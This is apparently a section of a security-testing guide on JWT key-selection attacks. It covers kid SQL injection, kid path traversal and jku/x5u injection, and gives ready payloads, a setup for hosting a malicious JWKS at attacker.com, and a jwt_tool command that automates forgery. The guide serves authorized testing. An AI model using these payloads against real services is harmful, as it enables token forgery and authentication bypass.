# JWT key lookup and remote key trust

Read for `kid`, `jku`, or `x5u` handling. Signature acceptance and a changed principal/capability are distinct from a fetched URL or a parse error. Status and limits: see the named record in the [verification registry](../../hack/verification.json). Record: `jwt-key-selection`.

## 5. ATTACK 4 — kid (Key ID) INJECTION

The `kid` header parameter specifies which key to use for verification. Trace how the identifier becomes a lookup. An unsafe SQL/path operation and its reachable effect must both be demonstrated; parameterized lookup or a fixed key map defeats these candidates.

### kid SQL Injection
```json
{"alg":"HS256","kid":"' UNION SELECT 'attacker_controlled_key' FROM dual--"}
```
If backend queries SQL: `SELECT key FROM keys WHERE kid = 'INPUT'`

Result: HMAC key = `'attacker_controlled_key'` → forge any payload signed with this value.

### kid Path Traversal (file read)
```json
{"alg":"HS256","kid":"../../../../dev/null"}
```
This candidate requires file-based key lookup, traversal, and acceptance of an empty HMAC key. Many verifiers reject such keys; confirm the actual behavior.

```json
{"alg":"HS256","kid":"../../../../etc/hostname"}
```
This candidate requires that exact file content to be used as an HMAC key, with known bytes and encoding. A path-looking `kid` alone is insufficient.


## 6. ATTACK 5 — jku / x5u Header Injection

`jku` identifies a JWK Set URL; `x5u` identifies an X.509 certificate URL. Verify whether the application uses either header and how it binds keys to an issuer. A candidate needs an attacker-influenced key source or destination outside that trust policy:
```json
{"alg":"RS256","jku":"https://attacker.com/malicious-jwks.json","kid":"my-key"}
```

The following retained setup is schematic: the JWKS export is a placeholder, not a complete executable program. Confirm the installed tool version and export format before use.

**Setup**:
```bash
# Generate RSA key pair:
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Create JWKS:
python3 -c "
import json, base64, struct
# ... (use python-jwcrypto or jwt_tool to export JWKS)
"

# Host malicious JWKS at attacker.com/malicious-jwks.json
# Sign JWT with attacker's private key
# Server fetches attacker's JWKS → verifies with attacker's public key → accepts
```

**jwt_tool automation**:
```bash
python3 jwt_tool.py JWT -X s -ju https://attacker.com/malicious-jwks.json
```
